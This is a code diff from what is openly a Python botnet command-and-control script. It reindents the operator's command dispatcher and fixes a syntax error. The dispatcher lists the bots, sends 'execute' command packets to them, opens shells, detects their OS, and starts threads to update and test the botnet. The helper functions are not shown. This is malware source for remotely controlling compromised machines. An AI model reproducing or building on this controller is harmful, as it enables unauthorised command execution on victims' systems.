@@ -117,35 +117,35 @@ def exec_command(cmd):
         #print("[*] Command packet sent")
 
 def process_cmd(cmd):
-    global botnet
-    sleep(1)
+        global botnet
+        sleep(1)
+        if "updater" in cmd:
+            updater_thread = Thread(target=update_botnet,args=())
+            updater_thread.start()
 
-    if "updater" in cmd:
-        updater_thread = Thread(target=update_botnet,args=())
-        updater_thread.start()
+        if(cmd == "show botnet"):
+            count = 1
+            for bot in botnet:
+                print("[*] %d : %s"%(count,str(bot)))
+                count += 1
 
-    if(cmd == "show botnet"):
-        count = 1
-        for bot in botnet:
-            print("[*] %d : %s"%(count,str(bot))
-            count += 1
+        if 'execute' in cmd:
+            #cmd = cmd.strip("execute ")
+            exec_command(cmd)
+            print("[*] Command packets sent!")
 
-    if 'execute' in cmd:
-        #cmd = cmd.strip("execute ")
-        exec_command(cmd)
-        print("[*] Command packets sent!")
+        if(cmd == "get os"):
+            detect_os()
 
-    if(cmd == "get os"):
-        detect_os()
+        if "shell" in cmd:
+            shell_exec(cmd)
 
-    if "shell" in cmd:
-        shell_exec(cmd)
+        if 'test' in cmd:
+            cmd = cmd.strip("test ")
+            t1 = Thread(target=test_bots,args=())
+            t1.start()
+            pass
 
-    if 'test' in cmd:
-        cmd = cmd.strip("test ")
-        t1 = Thread(target=test_bots,args=())
-        t1.start()
-        pass
 
 def main():
     try:
